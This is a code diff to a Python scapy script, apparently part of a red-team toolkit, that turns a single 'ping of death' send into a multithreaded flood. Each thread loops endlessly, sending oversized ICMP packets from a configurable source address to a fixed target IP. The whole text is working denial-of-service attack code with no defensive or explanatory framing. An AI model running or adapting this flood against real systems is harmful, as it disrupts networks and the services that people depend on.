@@ -1,11 +1,29 @@
+import threading
+import time
+from multiprocessing.pool import ThreadPool
+
+from loguru import logger
 from scapy.all import *
+
 from red.config import config
 
-# SOURCE_IP = "10.1.5.3" # Change this IP to spoof
 TARGET_IP = "10.1.5.2"
+stop = threading.Event()
 
-def run():#SOURCE_IP = "10.1.5.3", count=5):
-    ping_of_death = IP(src=config.attack.ip, dst=TARGET_IP)/ICMP()/("A"*65000)
+def connection(_: None):
+    while not stop.is_set():
+        ping_of_death = IP(src=config.attack.ip, dst=TARGET_IP)/ICMP()/("A"*50000)
+        send(ping_of_death)
 
-    # for _ in range(count):
-    print(srp1(ping_of_death))
+def run():
+    threads = int(config.attack.cli.pps)
+    logger.info(f"Starting with: "
+                f"{threads} ")
+
+    with ThreadPool(threads) as pool:
+        pool.map(connection, [None] * threads)
+    while True:
+        try:
+            time.sleep(1)
+        except KeyboardInterrupt:
+            stop.set()
